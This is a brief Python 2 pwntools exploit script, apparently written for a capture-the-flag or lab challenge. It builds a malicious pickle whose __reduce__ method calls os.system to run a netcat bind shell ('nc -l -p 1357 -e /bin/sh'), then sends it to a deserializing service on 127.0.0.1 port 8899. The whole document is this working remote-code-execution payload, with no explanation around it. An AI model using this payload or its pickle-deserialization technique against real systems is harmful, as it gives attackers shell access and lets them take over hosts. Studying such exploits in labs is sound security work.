from pwn import *
import pickle
import os

class Exploit(object):
        def __reduce__(self):
                return (os.system, ('nc -l -p 1357 -e /bin/sh',))

r = remote('127.0.0.1', 8899)

data = pickle.dumps(Exploit())
print r.recvuntil('data : ')
r.sendline(data)
